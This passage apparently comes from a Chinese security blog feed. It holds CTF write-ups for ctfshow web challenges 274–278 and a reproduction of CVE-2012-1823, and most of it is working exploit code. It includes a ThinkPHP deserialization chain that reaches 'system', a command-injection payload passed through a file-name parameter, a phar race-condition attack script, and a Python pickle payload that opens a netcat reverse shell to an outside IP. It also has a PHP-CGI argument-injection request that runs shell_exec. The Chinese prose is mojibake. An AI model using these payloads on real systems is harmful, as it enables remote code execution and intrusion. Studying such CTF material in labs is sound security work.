class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files[]=<span class="keyword">new</span> Pivot();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=<span class="keyword">array</span>(</span><br><span class="line">              <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">new</span> Request()</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// è¡¨å•è¯·æ±‚ç±»å‹ä¼ªè£…å˜é‡</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// è¡¨å•pjaxä¼ªè£…å˜é‡</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFOå˜é‡å ç”¨äºå…¼å®¹æ¨¡å¼</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// å…¼å®¹PATH_INFOè·å–</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// é»˜è®¤å…¨å±€è¿‡æ»¤æ–¹æ³• ç”¨é€—å·åˆ†éš”å¤šä¸ª</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// åŸŸåæ ¹ï¼Œå¦‚thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPSä»£ç†æ ‡è¯†</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IPä»£ç†è·å–æ ‡è¯†</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URLä¼ªé™æ€åç¼€</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="keyword">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/b1e5b9bbf1e54113a6b7255809c8e9be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAcXFfNTMwNjM0MzY=,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> filter(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;checkevil()===<span class="literal">false</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        copy(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡åˆ†æå¯ä»¥çœ‹åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥æ‰§è¡Œ $this-&gt;filename;å› æ­¤åšå‘½ä»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="function"><span class="keyword">fn</span>=1.<span class="title">php</span></span>;tac%<span class="number">20</span>flag.php;</span><br></pre></td></tr></table></figure><h2 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h2><p>æœ¬é¢˜åº”è¯¥æ˜¯é€šè¿‡pharå’Œååºåˆ—åŒ–ã€ç«äº‰å°†adminä¼ ä¸ºtrueï¼Œå¹¶é€šè¿‡æ„é€ pharåŒ…è¿›è¡Œç«äº‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 23:17:44</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-06 00:52:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$fn</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="string">&#x27;1;tac fla?.ph?&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è·å–pharåŒ…</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°æ˜¯pharåŒ…æ„é€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-05-06 00:54:43</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-05-06 01:05:31</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"><span class="comment">#è¯»å–pharåŒ…å†…å®¹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPhar</span>(<span class="params">phar</span>):</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(phar,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> p:</span><br><span class="line"><span class="keyword">return</span> p.read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#å†™å…¥pharåŒ…å†…å®¹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writePhar</span>(<span class="params">url,data</span>):</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;writing...&#x27;</span>)</span><br><span class="line">requests.post(url,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è§¦å‘unlinkçš„pharååºåˆ—åŒ–</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlinkPhar</span>(<span class="params">url,data</span>):</span></span><br><span class="line"><span class="keyword">global</span> success</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;unlinking...&#x27;</span>)</span><br><span class="line">res = requests.post(url,data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> success <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line">success = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">global</span> success</span><br><span class="line">url = <span class="string">&#x27;http://b49ae4f3-fdc9-4810-9cb1-d521dd9ce054.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">phar = getPhar(<span class="string">&#x27;phar.phar&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>  success <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">w = threading.Thread(target=writePhar,args=(url+<span class="string">&#x27;?fn=p.phar&#x27;</span>,phar))</span><br><span class="line">u = threading.Thread(target=unlinkPhar,args=(url+<span class="string">&#x27;?fn=phar://p.phar/test&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">w.start()</span><br><span class="line">u.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä½é¢˜ç›®è„šæœ¬ï¼Œå¯ä»¥ç›´æ¥ç«äº‰å‡ºflagã€‚</p><h2 id="web277-278"><a href="#web277-278" class="headerlink" title="web277~278"></a>web277~278</h2><p>æœ¬é¢˜é€šè¿‡çœ‹æºç å¯ä»¥å‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span><br></pre></td></tr></table></figure><p>ä»ä¸­å¯ä»¥çœ‹å‡ºæœ¬é¢˜è€ƒæŸ¥pythonååºåˆ—åŒ–<br>çœ‹fengå¸ˆå‚…åšå®¢ï¼š<br><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">pythonååºåˆ—åŒ–åŸç†</a><br><a href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pythonååºåˆ—åŒ–æ¼æ´</a><br>æ¨¡ä»¿å¸ˆå‚…çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFshow</span>():</span></span><br><span class="line"><span class="comment">#    def sw(self):</span></span><br><span class="line"><span class="comment">#     print(self.show)</span></span><br><span class="line"><span class="comment">#    def __init__(self,show):</span></span><br><span class="line"><span class="comment">#        self.show= show</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc 120.76.201.211 6000 -e /bin/sh&#x27;).read()&quot;</span>,))</span><br><span class="line"><span class="comment">#        return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;,))</span></span><br><span class="line"><span class="comment">#        return (os.system,(&#x27;&#x27;,))</span></span><br><span class="line"></span><br><span class="line">cs = CTFshow()</span><br><span class="line">ctf = pickle.dumps(cs)</span><br><span class="line"><span class="comment">#df = pickle.loads(ctf)</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(ctf))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2012-1823</title>
      <link href="/2022/01/07/CVE-2012-1823/"/>
      <url>/2022/01/07/CVE-2012-1823/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/1717894">CVE-2012-1823è¯¦ç»†ä»‹ç»</a><br>æ¼æ´å¤ç°ï¼ˆé¶åœºä¸ºctfshowï¼‰<br>åˆ©ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//url/index.php?-s</span></span><br></pre></td></tr></table></figure><p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´<br>è‹¥å‡ºç°æºç ç»„å­˜åœ¨<br>bpæŠ“åŒ…æŒ‰ä¸‹é¢ä¿®æ”¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?-d+allow_url_include%<span class="number">3</span>don+-d+auto_prepend_file%<span class="number">3</span>dphp%<span class="number">3</span>a<span class="comment">//input HTTP/1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 31</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php echo shell_exec(&quot;id&quot;); ?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><p>å‘é€åä¼šå‡ºç°id<br><img src="https://img-blog.csdnimg.cn/a40469abbd854b148663f75ce20614b9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¡¨æ˜åˆ©ç”¨æˆåŠŸ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/01/07/hello-world/"/>
      <url>/2022/01/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a 